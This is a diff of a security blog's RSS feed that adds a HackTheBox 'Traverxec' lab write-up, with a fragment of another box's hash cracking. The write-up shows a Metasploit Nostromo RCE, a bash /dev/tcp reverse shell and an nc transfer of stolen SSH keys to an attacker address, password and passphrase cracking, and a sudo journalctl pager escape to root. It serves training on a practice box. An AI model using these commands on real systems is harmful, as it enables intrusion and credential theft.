@@ -5,7 +5,354 @@
     <link>https://fahmifj.github.io/categories/writeup/</link>
     <description>Recent content in Writeup on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Fri, 06 Aug 2021 00:04:21 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 06 Aug 2021 16:12:18 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Traverxec</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-traverxec/</link>
+      <pubDate>Fri, 06 Aug 2021 16:12:18 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-traverxec/</guid>
+      <description>Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on journalctl binary, and this could be leveraged to obtain root access.</description>
+      <content:encoded><![CDATA[<p>Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on <code>journalctl</code> binary, and this could be leveraged to obtain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Path Traversal</li>
+<li>Sudo exploitation - journalctl</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Metasploit</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>An initial TCP scan discovers two open ports: SSH on port 22 and a Nostromo web server on port 80.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
+$ nmap -p22,80 -sC -sV  -oA nmap/10-tcp-allport-script-traverxec 10.10.10.165
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-13 16:11 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.165
+Host is up <span class="o">(</span>0.44s latency<span class="o">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nostromo 1.9.6
+<span class="p">|</span>_http-server-header: nostromo 1.9.6
+<span class="p">|</span>_http-title: TRAVERXEC
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.71 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---nostromo">TCP 80 - Nostromo</h3>
+<p>The hosted site is a personal website of David White.</p>
+<p><img class="img-container" src="imgs/image-20210714031626971.png" alt="image-20210714031626971"  />
+</p>
+<p>At the bottom of the page, there is a contact form with 4 input vectors.</p>
+<p><img class="img-container" src="imgs/image-20210714031846286.png" alt="image-20210714031846286"  />
+</p>
+<p>I submitted some values  and then started to observe the network traffic, but nothing happen there.</p>
+<p><img class="img-container" src="imgs/image-20210714032010619.png" alt="image-20210714032010619"  />
+</p>
+<p>I  ran gobuster, but it also didn&rsquo;t find any interesting.</p>
+<h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
+<p>From previous <code>nmap</code>, nmap identified the <code>nostromo</code> version to be 1.9.6. Feeding that version on <code>searchsploit</code> pops a remote code execution exploit.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
+$ searchsploit nostromo 1.9.6         
+--------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                               <span class="p">|</span>  Path
+--------------------------------------------------------------------------------------------- ---------------------------------
+nostromo 1.9.6 - Remote Code Execution                                                       <span class="p">|</span> multiple/remote/47837.py
+--------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="nostromo-rce-cve-2019-16278-metasploit">Nostromo RCE CVE-2019-16278 (Metasploit)</h4>
+<p>Metasploit also has a module for the Nostromo 1.9.6 RCE and I will use that.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
+$ msfconsole -q
+msf6 &gt; search nostromo
+
+Matching <span class="nv">Modules</span>
+<span class="o">================</span>
+
+   <span class="c1">#  Name                                   Disclosure Date  Rank  Check  Description</span>
+   -  ----                                   ---------------  ----  -----  -----------
+   <span class="m">0</span>  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
+
+
+Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/multi/http/nostromo_code_exec
+
+msf6 &gt; use <span class="m">0</span>
+<span class="o">[</span>*<span class="o">]</span> Using configured payload cmd/unix/reverse_perl
+</code></pre></div><p>Once all the configs are set, I will run the exploits. This results in an interactive shell access as <code>www-data</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> &gt; run
+
+<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.34:53 
+<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable.
+<span class="o">[</span>*<span class="o">]</span> Configuring Automatic <span class="o">(</span>Unix In-Memory<span class="o">)</span> target
+<span class="o">[</span>*<span class="o">]</span> Sending cmd/unix/reverse_perl <span class="nb">command</span> payload
+<span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.34:53 -&gt; 10.10.10.165:52716<span class="o">)</span> at 2021-07-13 16:31:29 -0400
+
+id
+
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+hostname <span class="o">&amp;&amp;</span> ip a
+traverxec
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UNKNOWN group default qlen <span class="m">1000</span>
+    link/ether 00:50:56:b9:a0:f8 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0
+       valid_lft forever preferred_lft forever
+</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I will create another interactive shell session so I can upgrade my shell with the PTY trick.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">which bash
+/usr/bin/bash
+bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.34/53 0&gt;&amp;1&#34;</span> <span class="p">&amp;</span>
+</code></pre></div><p>On my new session:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52718</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>421<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@traverxec:/usr/bin$ script /dev/null -c bash 
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@traverxec:/usr/bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@traverxec:/usr/bin$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> suspended  nc -nvlp <span class="m">53</span>
+→ kali@kali «traverxec» «10.10.14.34» 
+$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>     
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> continued  nc -nvlp <span class="m">53</span>
+
+www-data@traverxec:/usr/bin$ stty cols <span class="m">127</span> rows <span class="m">30</span>
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-david">Shell as david</h3>
+<h4 id="nostromo-config">Nostromo config</h4>
+<p>The <code>nostromo</code> config file under <code>/var/nostromo/conf</code> reveals that there is a <code>.htpasswd</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
+<span class="c1"># MAIN [MANDATORY]</span>
+
+servername              traverxec.htb
+serverlisten            *
+serveradmin             david@traverxec.htb
+serverroot              /var/nostromo
+servermimes             conf/mimes
+docroot                 /var/nostromo/htdocs
+docindex                index.html
+
+<span class="c1"># LOGS [OPTIONAL]</span>
+
+logpid                  logs/nhttpd.pid
+
+<span class="c1"># SETUID [RECOMMENDED]</span>
+
+user                    www-data
+
+<span class="c1"># BASIC AUTHENTICATION [OPTIONAL]</span>
+
+htaccess                .htaccess
+htpasswd                /var/nostromo/conf/.htpasswd
+
+<span class="c1"># ALIASES [OPTIONAL]</span>
+
+/icons                  /var/nostromo/icons
+
+<span class="c1"># HOMEDIRS [OPTIONAL]</span>
+
+homedirs                /home
+homedirs_public         public_www
+</code></pre></div><p>This<code>.htpasswd </code> file contains a password hash for user david.</p>
+<pre><code>www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+www-data@traverxec:/var/nostromo/conf$ cat /etc/passwd | grep sh &amp;&amp; ls -l /home
+root:x:0:0:root:/root:/bin/bash
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+david:x:1000:1000:david,,,:/home/david:/bin/bash
+total 4
+drwx--x--x 6 david david 4096 Jul 13 06:57 david
+</code></pre><h4 id="password-cracking">Password Cracking</h4>
+<p><code>JtR</code> can recover the password easily.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$./john.exe hashes/traverxec-david.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                                  
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+Using default input encoding: UTF-8
+Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1</span>$ <span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3<span class="o">])</span>
+Will run <span class="m">8</span> OpenMP threads
+Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+Nowonly4me       <span class="o">(</span>david<span class="o">)</span>
+1g 0:00:00:43 DONE <span class="o">(</span>2021-07-14 03:44<span class="o">)</span> 0.02307g/s 244113p/s 244113c/s 244113C/s NuiKo910..Noury
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>But turns out it&rsquo;s not a reused password.</p>
+<pre><code>www-data@traverxec:/var/nostromo/conf$ su david
+Password: 
+su: Authentication failure
+www-data@traverxec:/var/nostromo/conf$ 
+</code></pre><h4 id="path-traversal---david-home-directory">Path Traversal - David home directory</h4>
+<p>The david home directory is not readable by others, but with execute permissions,  I can determine what files all are available under david&rsquo;s home directory by spamming one character and leverage the tab completion. This is one of the benefits of doing a shell upgrade!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/
+drwx--x--x <span class="m">6</span> david david <span class="m">4096</span> Jul <span class="m">13</span> 06:57 /home/david/
+www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/.ssh
+drwx------ <span class="m">2</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/.ssh
+www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/user.txt
+-r--r----- <span class="m">1</span> root david <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/user.txt
+www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/
+ls: cannot open directory <span class="s1">&#39;/home/david/&#39;</span>: Permission denied
+</code></pre></div><p>Then, when I type <code>public_www</code> (from nostromo config), the tab completion confirms that the folder is there. With <code>r-x</code>, I can use <code>ls -lR</code> command to list all the available contents recursively.</p>
+<pre><code>www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/public_www
+drwxr-xr-x 3 david david 4096 Oct 25  2019 /home/david/public_www
+www-data@traverxec:/var/nostromo/conf$ ls -lR /home/david/public_www
+/home/david/public_www:
+total 8
+-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
+drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
+
+/home/david/public_www/protected-file-area:
+total 4
+-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
+</code></pre><p>The <code>backup-ssh-identity-files.tgz</code> seems interesting, I will grab that and send it over to my Kali.</p>
+<pre><code>www-data@traverxec:/var/nostromo/conf$ cat /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz | nc 10.10.14.34 53
+</code></pre><p>On my Kali:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
+$ nc -nvlp <span class="m">53</span> &gt; loot/backup-ssh-identity-files.tgz
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52728</span>
+</code></pre></div><h4 id="passphrase-crack">Passphrase crack</h4>
+<p>The backup file contains a set of SSH keys.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.34» 
+$ tar -xvf backup-ssh-identity-files.tgz 
+home/david/.ssh/
+home/david/.ssh/authorized_keys
+home/david/.ssh/id_rsa
+home/david/.ssh/id_rsa.pub
+</code></pre></div><p>But, it is protected with a passphrase.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «ssh-keys» «10.10.14.34» 
+$ ssh -i id_rsa david@traverxec.htb 
+Enter passphrase <span class="k">for</span> key <span class="s1">&#39;id_rsa&#39;</span>: 
+david@traverxec.htb<span class="err">&#39;</span>s password:
+</code></pre></div><p>So I will convert the key to crackable format hash using <code>ssh2john</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «ssh-keys» «10.10.14.34» 
+$ ssh2john id_rsa &gt; david_rsa.hash
+→ kali@kali «ssh-keys» «10.10.14.34» 
+$ /usr/share/john/ssh2john.py id_rsa &gt; david_rsa.hash 
+→ kali@kali «ssh-keys» «10.10.14.34» 
+$ cat david_rsa.hash 
+id_rsa:<span class="nv">$sshng$1$16$477</span>EEFFBA56F9D283D349033D5D08C4F<span class="nv">$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672</span>...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>And <code>JtR</code> can also recover the passphrase. It is <code>hunter</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./john.exe hashes/traverxec-david-rsa.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                    
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64<span class="o">])</span>
+Cost <span class="m">1</span> <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES<span class="o">])</span> is <span class="m">0</span> <span class="k">for</span> all loaded hashes
+Cost <span class="m">2</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1</span> <span class="k">for</span> all loaded hashes
+Will run <span class="m">8</span> OpenMP threads
+Note: This format may emit <span class="nb">false</span> positives, so it will keep trying even after
+finding a possible candidate.
+Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+hunter           <span class="o">(</span>id_rsa<span class="o">)</span>
+</code></pre></div><h4 id="ssh---david">SSH - David</h4>
+<p>The key and the passphrase are work for user david.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «traverxec» «10.10.14.34» 
+$ ssh -i ssh-keys/david_rsa david@traverxec.htb
+Enter passphrase <span class="k">for</span> key <span class="s1">&#39;ssh-keys/david_rsa&#39;</span>: 
+Linux traverxec 4.19.0-6-amd64 <span class="c1">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
+Last login: Tue Jul <span class="m">13</span> 06:54:56 <span class="m">2021</span> from 10.10.16.7
+david@traverxec:~$ id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
+</code></pre></div><p>User flag is done here</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~$ ls -la
+total <span class="m">60</span>
+drwx--x--x <span class="m">6</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:57 .
+drwxr-xr-x <span class="m">3</span> root  root   <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> ..
+-rwxr-xr-x <span class="m">1</span> david david <span class="m">18992</span> Jul <span class="m">13</span> 05:43 <span class="m">47163</span>
+lrwxrwxrwx <span class="m">1</span> root  root      <span class="m">9</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_history -&gt; /dev/null
+-rw-r--r-- <span class="m">1</span> david david   <span class="m">220</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_logout
+-rw-r--r-- <span class="m">1</span> david david  <span class="m">3544</span> Jul <span class="m">13</span> 06:57 .bashrc
+drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> bin
+drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:56 .local
+-rw-r--r-- <span class="m">1</span> david david   <span class="m">807</span> Oct <span class="m">25</span>  <span class="m">2019</span> .profile
+drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> public_www
+drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> .ssh
+-r--r----- <span class="m">1</span> root  david    <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> user.txt
+david@traverxec:~$ cat user.txt 
+7db0...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>On under <code>bin</code> folder, there is one suspicious script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~$ ls -l bin/
+total <span class="m">8</span>
+-r-------- <span class="m">1</span> david david <span class="m">802</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.head
+-rwx------ <span class="m">1</span> david david <span class="m">363</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.sh
+</code></pre></div><p>When I run the script, I get the following results:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~/bin$ ./server-stats.sh 
+                                                                          .----.
+                                                              .---------. <span class="p">|</span> <span class="o">==</span> <span class="p">|</span>
+   Webserver Statistics and Data                              <span class="p">|</span>.-<span class="s2">&#34;&#34;&#34;&#34;&#34;-.| |----|
+</span><span class="s2">         Collection Script                                    ||       || | == |
+</span><span class="s2">          (c) David, 2019                                     ||       || |----|
+</span><span class="s2">                                                              |&#39;-.....-&#39;| |::::|
+</span><span class="s2">                                                              &#39;&#34;&#34;)---(&#34;&#34;&#39; |___.|
+</span><span class="s2">                                                             /:::::::::::\&#34;    &#34;</span>
+                                                            /:::<span class="o">=======</span>:::<span class="se">\
+</span><span class="se"></span>                                                        jgs <span class="s1">&#39;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#39;</span> 
+
+Load:  18:24:49 up 17:04,  <span class="m">1</span> user,  load average: 0.13, 0.04, 0.01
+ 
+Open nhttpd sockets: <span class="m">0</span>
+Files in the docroot: <span class="m">117</span>
+ 
+Last <span class="m">5</span> journal log lines:
+-- Logs begin at Tue 2021-07-13 01:20:43 EDT, end at Tue 2021-07-13 18:24:49 EDT. --
+Jul <span class="m">13</span> 17:16:02 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nv">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span><span class="m">33</span> <span class="nv">euid</span><span class="o">=</span><span class="m">0</span> <span class="nv">tty</span><span class="o">=</span>/dev/pts/0 <span class="nv">ruser</span><span class="o">=</span>www-data <span class="nv">rhost</span><span class="o">=</span>  <span class="nv">user</span><span class="o">=</span>www-data
+Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: conversation failed
+Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: auth could not identify password <span class="k">for</span> <span class="o">[</span>www-data<span class="o">]</span>
+Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: www-data : <span class="nb">command</span> not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/dev/shm <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>list
+Jul <span class="m">13</span> 17:16:04 traverxec nologin<span class="o">[</span>24564<span class="o">]</span>: Attempted login by UNKNOWN on UNKNOWN
+</code></pre></div><h4 id="sudo-journalctl">Sudo journalctl</h4>
+<p>Based on the contents of <code>server-stats.sh</code>, user <code>david</code> has ability to run <code>journalctl</code>  with sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~/bin$ cat server-stats.sh 
+<span class="c1">#!/bin/bash</span>
+
+cat /home/david/bin/server-stats.head
+<span class="nb">echo</span> <span class="s2">&#34;Load: `/usr/bin/uptime`&#34;</span>
+<span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
+<span class="nb">echo</span> <span class="s2">&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
+<span class="nb">echo</span> <span class="s2">&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
+<span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
+<span class="nb">echo</span> <span class="s2">&#34;Last 5 journal log lines:&#34;</span>
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service <span class="p">|</span> /usr/bin/cat 
+</code></pre></div><p>But, when I run <code>/usr/bin/sudo /usr/bin/journalctl</code>, it asks for a password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> david: 
+Sorry, try again.
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> david: 
+Sorry, try again.
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> david: 
+</code></pre></div><p>Then, I grab this line <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> and run it. This is what I get:</p>
+<p><img class="img-container" src="imgs/image-20210714052617836.png" alt="image-20210714052617836"  />
+</p>
+<p>That means I can run the following command with sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
+</code></pre></div><p>According to the <a href="https://gtfobins.github.io/gtfobins/journalctl/">GTFOBins</a>, the default pager of <code>journalctl</code> is <code>less</code>. Now since it runs with root privilege, I can escape from the pager using  <code>!/bin/bash</code>.</p>
+<p><img class="img-container" src="imgs/image-20210714054042963.png" alt="image-20210714054042963"  />
+</p>
+<hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec/">https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec/</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/journalctl/">https://gtfobins.github.io/gtfobins/journalctl/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Writeup</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-writeup/</link>
@@ -14,12 +361,12 @@
       <guid>https://fahmifj.github.io/writeups/hackthebox/htb-writeup/</guid>
       <description>Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database, and these credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.</description>
       <content:encoded><![CDATA[<p>Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database, and these credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.</p>
-<h3 id="skills-learned">Skills Learned</h3>
+<h4 id="skills-learned">Skills Learned</h4>
 <ul>
 <li>Exploiting CMS Made Simple</li>
 <li>Path Hijack</li>
 </ul>
-<h3 id="tools">Tools</h3>
+<h4 id="tools">Tools</h4>
 <ul>
 <li>Nmap</li>
 <li><a href="https://www.exploit-db.com/exploits/46635">CMS Made Simple Exploit PoC</a></li>
@@ -718,18 +1065,18 @@ name    pass
 brucetherealadmin       <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt
 </code></pre></div><h4 id="password-crack">Password Crack</h4>
 <p>The password has been recovered back to plain text using <code>hashcat</code> and <code>rockyou.txt</code>.</p>
-<pre><code>C:\tools\hashcat6&gt; hashcat.exe -m 7900 &quot;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&quot; rockyou.txt
-...[SNIP]...
-$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
